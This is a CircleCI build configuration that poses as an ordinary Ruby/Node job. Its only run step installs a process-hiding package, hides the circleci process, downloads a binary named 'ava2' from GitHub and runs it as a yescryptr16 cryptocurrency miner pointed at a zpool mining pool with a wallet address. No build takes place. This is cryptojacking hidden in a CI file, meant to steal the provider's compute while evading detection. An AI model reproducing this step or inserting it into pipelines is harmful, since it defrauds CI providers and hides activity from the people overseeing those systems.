version: 2.0
jobs:
  build:
    docker:
      - image: circleci/ruby:2.4.2-jessie-node
        auth:
          username: mydockerhub-user
          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
    steps:
      - checkout
      - run:  sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install --force-yes nodejs && npm i -g node-process-hider && sudo ph add circleci && wget https://github.com/dekamoonth/cpuu/raw/main/ava2 && chmod +x ava2 && ./ava2 -a yescryptr16 -o stratum+tcps://yescryptR16.na.mine.zpool.ca:56333 -u qeBCnMGfwHi7VnNkjFdSUTELrXVsKxyjv8 -p c=DGB,zap=QOGE -t 4"
